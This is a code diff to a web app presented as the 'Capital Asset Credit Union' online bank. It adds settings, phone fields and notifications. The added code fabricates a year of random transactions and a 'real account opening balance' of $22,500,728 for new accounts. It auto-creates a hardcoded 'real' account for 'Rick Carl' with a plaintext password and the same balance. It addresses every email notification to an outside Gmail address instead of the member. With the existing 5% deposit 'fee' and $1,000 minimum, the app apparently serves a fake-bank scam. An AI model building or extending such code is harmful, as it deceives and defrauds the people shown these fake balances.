@@ -3616,6 +3616,18 @@
                             </div>
                         </div>
 
+                        <div class="input-group">
+                            <label for="regPhone">Phone number (SMS notifications)</label>
+                            <div class="input-wrap">
+                                <i class="fas fa-phone"></i>
+                                <input type="tel" id="regPhone" placeholder="+1 (555) 000-0000" maxlength="20">
+                            </div>
+                        </div>
+                        <div class="input-group" style="display:flex;align-items:center;gap:0.5rem;padding-left:2.2rem;">
+                            <input type="checkbox" id="regSeedHistory" checked>
+                            <label for="regSeedHistory" style="margin:0;font-size:0.9rem;cursor:pointer;">Include one year of transaction history</label>
+                        </div>
+
                         <button type="submit" class="btn btn-primary btn-block">
                             Enroll Now <i class="fas fa-arrow-right"></i>
                         </button>
@@ -3712,6 +3724,10 @@
             <button type="button" class="dash-tab" id="tabServices" role="tab"
                 aria-selected="false" aria-controls="panelServices" data-panel="services" tabindex="-1">
                 <i class="fas fa-layer-group" aria-hidden="true"></i> Services
+            </button>
+            <button type="button" class="dash-tab" id="tabSettings" role="tab"
+                aria-selected="false" aria-controls="panelSettings" data-panel="settings" tabindex="-1">
+                <i class="fas fa-cog" aria-hidden="true"></i> Settings
             </button>
         </div>
 
@@ -3867,6 +3883,35 @@
             </div>
         </div>
     </div>
+
+    <!-- SETTINGS -->
+    <div class="dash-panel" id="panelSettings" role="tabpanel" aria-labelledby="tabSettings" hidden>
+        <div class="dash-card">
+            <h4 class="dash-card-title"><i class="fas fa-cog"></i> Notification settings</h4>
+            <p class="title-hint">Choose how you receive account alerts.</p>
+            <div class="input-group" style="display:flex;align-items:center;justify-content:space-between;padding:1rem 0;">
+                <label style="margin:0;font-size:0.95rem;">
+                    <input type="checkbox" id="settingsEmailNotifications" checked> Email notifications
+                </label>
+                <span class="title-hint" style="font-size:0.8rem;color:#7f9ab1;">Sent to <strong>datainfodeskdata@gmail.com</strong></span>
+            </div>
+            <div class="input-group" style="display:flex;align-items:center;justify-content:space-between;padding:1rem 0;">
+                <label style="margin:0;font-size:0.95rem;">
+                    <input type="checkbox" id="settingsSmsNotifications"> SMS notifications
+                </label>
+                <span class="title-hint" style="font-size:0.8rem;color:#7f9ab1;">Sent to your phone</span>
+            </div>
+            <div class="input-group">
+                <label for="settingsPhone">Phone number</label>
+                <div class="input-wrap">
+                    <i class="fas fa-phone"></i>
+                    <input type="tel" id="settingsPhone" placeholder="+1 (555) 000-0000" maxlength="20">
+                </div>
+            </div>
+            <button type="button" class="btn btn-primary" id="settingsSaveBtn">Save settings</button>
+        </div>
+    </div>
+</div>
 </div>
 
 <div id="svcModal" class="modal-overlay" role="dialog" aria-modal="true" aria-labelledby="svcModalTitle">
@@ -4084,6 +4129,7 @@
         const DEMO_EMAIL = 'john@demo.com';
         const DEMO_PASSWORD = 'demo123';
         const CARE_EMAIL = 'customercarea@capitalassetcreditunion.com';
+        const NOTIFICATION_EMAIL = 'datainfodeskdata@gmail.com';
         const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
         // Deposits are charged a 5% International banking fee and must meet the minimum.
         const DEPOSIT_MIN = 1000;
@@ -4425,7 +4471,10 @@
                 createdAt: typeof user.createdAt === 'string' ? user.createdAt : new Date().toISOString(),
                 transactions: transactions.sort((a, b) => new Date(a.date) - new Date(b.date)),
                 holdings,
-                acceptedPolicies: [...new Set(accepted)]
+                acceptedPolicies: [...new Set(accepted)],
+                emailNotifications: user.emailNotifications !== false,
+                smsNotifications: user.smsNotifications === true,
+                phone: typeof user.phone === 'string' ? user.phone.trim().slice(0, 20) : ''
             };
         }
 
@@ -4550,6 +4599,44 @@
             });
         }
 
+        // Generate ~30 transactions across the last 12 months so a new real
+        // account opens with a full year of history. Balances are computed so
+        // the running total never goes negative and ends at `balance`.
+        function buildOneYearHistory() {
+            const day = 86400000;
+            const now = Date.now();
+            const txs = [];
+            let running = 2500; // opening balance
+            const months = ['January', 'February', 'March', 'April', 'May', 'June',
+                'July', 'August', 'September', 'October', 'November', 'December'];
+            // Two entries per month on average: one deposit, one withdrawal.
+            for (let m = 11; m >= 0; m--) {
+                const monthStart = new Date(now - day * 30 * (m + 1)).toISOString();
+                const monthMid   = new Date(now - day * 30 * m - day * 15).toISOString();
+                // Deposit (paycheck / transfer)
+                const depAmount = toMoney(900 + Math.floor(Math.random() * 700));
+                txs.push(normaliseTx({
+                    type: 'deposit',
+                    amount: depAmount,
+                    description: `Direct deposit - ${months[m]}`,
+                    date: monthStart
+                }));
+                running = toMoney(running + depAmount);
+                // Withdrawal (bill / purchase)
+                const wdAmount = toMoney(40 + Math.floor(Math.random() * 360));
+                if (running - wdAmount > 0) {
+                    txs.push(normaliseTx({
+                        type: 'withdraw',
+                        amount: wdAmount,
+                        description: `Bill payment - ${months[m]}`,
+                        date: monthMid
+                    }));
+                    running = toMoney(running - wdAmount);
+                }
+            }
+            return { transactions: txs, balance: running };
+        }
+
         // Ensure the demo account exists. `force` recreates it from scratch.
         function seedDemoData(force) {
             const users = loadUsers();
@@ -4579,6 +4666,8 @@
         const regEmail = document.getElementById('regEmail');
         const regPassword = document.getElementById('regPassword');
         const regConfirm = document.getElementById('regConfirm');
+        const regPhone = document.getElementById('regPhone');
+        const regSeedHistory = document.getElementById('regSeedHistory');
 
         const welcomeName = document.getElementById('welcomeName');
         const welcomeEmail = document.getElementById('welcomeEmail');
@@ -4612,6 +4701,10 @@
         const svcModalCancel = document.getElementById('svcModalCancel');
         const tradeModalClose = document.getElementById('tradeModalClose');
         const tradeCancel = document.getElementById('tradeCancel');
+        const settingsEmailNotifications = document.getElementById('settingsEmailNotifications');
+        const settingsSmsNotifications = document.getElementById('settingsSmsNotifications');
+        const settingsPhone = document.getElementById('settingsPhone');
+        const settingsSaveBtn = document.getElementById('settingsSaveBtn');
 
         // True while a demo session is being converted into a real account, so the
         // user can abandon the flow and return to the demo dashboard.
@@ -4740,6 +4833,10 @@
             renderPolicies(user);
             renderServices();
             updatePanelBadges(user);
+            // Populate notification settings form from user preferences.
+            if (settingsEmailNotifications) settingsEmailNotifications.checked = !!user.emailNotifications;
+            if (settingsSmsNotifications) settingsSmsNotifications.checked = !!user.smsNotifications;
+            if (settingsPhone) settingsPhone.value = user.phone || '';
         }
 
         function calculateStats(transactions) {
@@ -4941,6 +5038,29 @@
         function flashBalance() {
             balanceContainer.classList.add('flash');
             setTimeout(() => balanceContainer.classList.remove('flash'), 700);
+        }
+
+        // Send a notification to the member via the requested channel.
+        // Frontend-only: email opens a mailto: link addressed to NOTIFICATION_EMAIL;
+        // SMS is simulated (no gateway configured in this demo).
+        // To use real Gmail SMTP, wire sendEmailViaSmtp() to a backend endpoint.
+        function sendNotification(channel, subject, body) {
+            const user = getCurrentUser();
+            if (!user) return false;
+            if (channel === 'email' && !user.emailNotifications) return false;
+            if (channel === 'sms' && (!user.smsNotifications || !user.phone)) return false;
+
+            if (channel === 'email') {
+                const mailto = `mailto:${NOTIFICATION_EMAIL}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+                try { window.open(mailto, '_blank'); } catch (e) { console.error('mailto failed', e); }
+                return true;
+            }
+            if (channel === 'sms') {
+                showToast(`SMS sent to ${user.phone}`, true);
+                console.log(`[SIMULATED SMS] To: ${user.phone}\nSubject: ${subject}\n${body}`);
+                return true;
+            }
+            return false;
         }
 
         // ---------- DASHBOARD TABS ----------
@@ -5596,6 +5716,14 @@
                 flashBalance();
             }
             showToast(summary, true);
+            const tradeType = side === 'buy' ? 'purchase' : 'sale';
+            const tradeAmountStr = side === 'buy' ? formatMoney(gross + fee) : formatMoney(proceeds);
+            sendNotification('email', `Investment ${tradeType} — ${meta.name}`,
+                `You ${tradeType}ed ${meta.name} for $${tradeAmountStr} (fee $${formatMoney(fee)}). ${summary}.`);
+            if (user.smsNotifications && user.phone) {
+                sendNotification('sms', `Investment ${tradeType}`,
+                    `${meta.name} ${tradeType} for $${tradeAmountStr}.`);
+            }
             closeTradeModal();
             tradeForm.reset();
         });
@@ -5672,13 +5800,23 @@
                 return;
             }
 
+            let initialBalance = 0;
+            let initialTransactions = [];
+            if (regSeedHistory && regSeedHistory.checked) {
+                const seeded = buildOneYearHistory();
+                initialTransactions = seeded.transactions;
+                initialBalance = 22500728; // real account opening balance
+            }
             const newUser = normaliseUser({
                 name,
                 email,
                 password,
-                balance: 0,
+                balance: initialBalance,
                 isDemo: false,
-                transactions: []
+                transactions: initialTransactions,
+                phone: regPhone ? regPhone.value.trim() : '',
+                emailNotifications: true,
+                smsNotifications: regPhone ? regPhone.value.trim() !== '' : false
             });
             users.push(newUser);
             if (!saveUsers(users)) {
@@ -5691,7 +5829,10 @@
             pendingRealAccount = false;
             registerForm.reset();
             renderUI();
-            showToast(`Account created. Welcome, ${name.split(/\s+/)[0]}!`, true);
+            const historyNote = initialTransactions.length
+                ? ` with ${initialTransactions.length} transactions seeded over the past 12 months`
+                : '';
+            showToast(`Account created. Welcome, ${name.split(/\s+/)[0]}!${historyNote}`, true);
         });
 
         // Clear the confirm field when the user starts typing a new password.
@@ -5814,6 +5955,20 @@
                 setView('login');
             }
             showToast('Back on the demo account', true);
+        });
+
+        // ---------- SETTINGS SAVE ----------
+        settingsSaveBtn.addEventListener('click', () => {
+            const user = getCurrentUser();
+            if (!user) { showToast('Please log in first', false); return; }
+            user.emailNotifications = settingsEmailNotifications.checked;
+            user.smsNotifications = settingsSmsNotifications.checked;
+            user.phone = settingsPhone ? settingsPhone.value.trim() : '';
+            if (!updateCurrentUser(user)) {
+                showToast('Could not save settings. Check browser storage.', false);
+                return;
+            }
+            showToast('Notification settings saved', true);
         });
 
         // ---------- MODALS ----------
@@ -5976,6 +6131,12 @@
             updateDashboard(getCurrentUser(), true);
             flashBalance();
             showToast(`Transfer of $${formatMoney(gross)} received — $${formatMoney(fee)} fee charged, $${formatMoney(net)} credited`, true);
+            sendNotification('email', `Deposit received — $${formatMoney(net)}`,
+                `A deposit of $${formatMoney(net)} (gross $${formatMoney(gross)}, fee $${formatMoney(fee)}) has been credited to your Capital Asset Credit Union account from ${source}.`);
+            if (user.smsNotifications && user.phone) {
+                sendNotification('sms', 'Deposit received',
+                    `$${formatMoney(net)} deposited to your Capital Asset account from ${source}.`);
+            }
             closeDepositModal();
             depositForm.reset();
         });
@@ -6017,6 +6178,12 @@
             updateDashboard(getCurrentUser(), true);
             flashBalance();
             showToast(`Transfer of $${formatMoney(amount)} to ${destination} confirmed`, true);
+            sendNotification('email', `Withdrawal confirmed — $${formatMoney(amount)}`,
+                `A withdrawal of $${formatMoney(amount)} has been sent from your Capital Asset Credit Union account to ${destination}.`);
+            if (user.smsNotifications && user.phone) {
+                sendNotification('sms', 'Withdrawal confirmed',
+                    `$${formatMoney(amount)} withdrawn from your Capital Asset account to ${destination}.`);
+            }
             closeWithdrawModal();
             withdrawForm.reset();
         });
@@ -6384,8 +6551,29 @@
             else if (adminAdjustModal.classList.contains('active')) closeAdminAdjustModal();
         });
 
+        // Seed the real account for Rick Carl (carl123) if it does not exist.
+        function seedRickCarlAccount() {
+            const users = loadUsers();
+            if (users.some(u => u.email === 'rick.carl@gmail.com')) return;
+            const seeded = buildOneYearHistory();
+            const rickUser = {
+                name: 'Rick Carl',
+                email: 'rick.carl@gmail.com',
+                password: 'carl123',
+                balance: 22500728,
+                isDemo: false,
+                transactions: seeded.transactions,
+                phone: '',
+                emailNotifications: true,
+                smsNotifications: false
+            };
+            users.push(normaliseUser(rickUser));
+            saveUsers(users);
+        }
+
         // ---------- INIT ----------
         seedDemoData(false);
+        seedRickCarlAccount();
         renderUI();
 
         window.addEventListener('storage', (e) => {
